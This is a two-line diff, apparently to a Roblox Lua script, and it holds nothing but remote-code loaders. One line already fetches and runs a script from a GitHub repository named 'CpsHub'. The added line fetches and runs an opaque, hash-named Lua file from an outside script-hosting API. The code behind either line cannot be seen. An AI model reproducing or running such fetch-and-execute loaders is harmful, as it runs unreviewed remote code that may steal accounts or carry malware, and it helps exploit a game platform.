@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Rx1m/CpsHub/refs/heads/main/Chatgptmadenotif"))()
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/b54b28eae921b0ba7811de7521119e6a8d2babcc06ea76a602298c9908d41c0b.lua"))()
